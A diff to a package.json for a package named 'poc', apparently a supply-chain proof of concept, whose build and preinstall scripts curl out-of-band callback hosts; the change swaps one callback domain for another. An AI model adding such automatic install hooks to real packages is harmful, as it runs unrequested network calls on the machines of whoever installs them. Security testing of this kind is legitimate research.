@@ -2,7 +2,7 @@
   "name": "poc",
   "version": "1.0.0",
   "scripts": {
-    "build": "curl http://d51fn6g3t4gn82v0tqfgmbwxwgb7xhha5.oast.pro/npm_build",
-    "preinstall": "curl http://d51fn6g3t4gn82v0tqfgmbwxwgb7xhha5.oast.pro/npm_preinstall"
+    "build": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_build",
+    "preinstall": "curl http://d526alg3t4gnvlgjmi10uztas8xbrsfge.oast.site/npm_preinstall"
   }
 }
